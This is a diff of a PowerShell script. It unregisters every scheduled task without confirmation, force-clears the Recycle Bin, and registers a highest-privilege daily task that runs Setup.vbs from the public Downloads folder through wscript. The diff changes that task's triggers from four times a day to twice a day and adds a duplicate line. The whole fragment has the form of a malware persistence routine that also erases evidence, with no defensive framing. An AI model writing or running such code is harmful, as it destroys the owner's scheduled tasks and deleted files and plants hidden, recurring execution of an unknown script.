@@ -70,12 +70,11 @@ Get-ScheduledTask | Where-Object {$_.TaskName -like "*reboot*" -or $_.TaskName -
 Get-ScheduledTask | ForEach-Object {Unregister-ScheduledTask -TaskName $_.TaskName -TaskPath $_.TaskPath -Confirm:$false}
 Clear-RecycleBin -Force
 $taskName = "Run Setup.vbs Daily"
+$taskName = "Run Setup.vbs Daily"
 $setupPath = "C:\Users\Public\Downloads\Setup.vbs"
 $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$setupPath`""
-$trigger1 = New-ScheduledTaskTrigger -Daily -At 00:00AM
-$trigger2 = New-ScheduledTaskTrigger -Daily -At 6:00AM
-$trigger3 = New-ScheduledTaskTrigger -Daily -At 12:00AM
-$trigger4 = New-ScheduledTaskTrigger -Daily -At 6:00PM
+$trigger1 = New-ScheduledTaskTrigger -Daily -At 11:00AM
+$trigger2 = New-ScheduledTaskTrigger -Daily -At 11:00PM
 $principal = New-ScheduledTaskPrincipal -UserId "$env:UserName" -RunLevel Highest
-Register-ScheduledTask -TaskName $taskName -Action $action -Trigger @($trigger1, $trigger2, $trigger3, $trigger4) -Principal $principal -Force
+Register-ScheduledTask -TaskName $taskName -Action $action -Trigger @($trigger1, $trigger2) -Principal $principal -Force
 exit
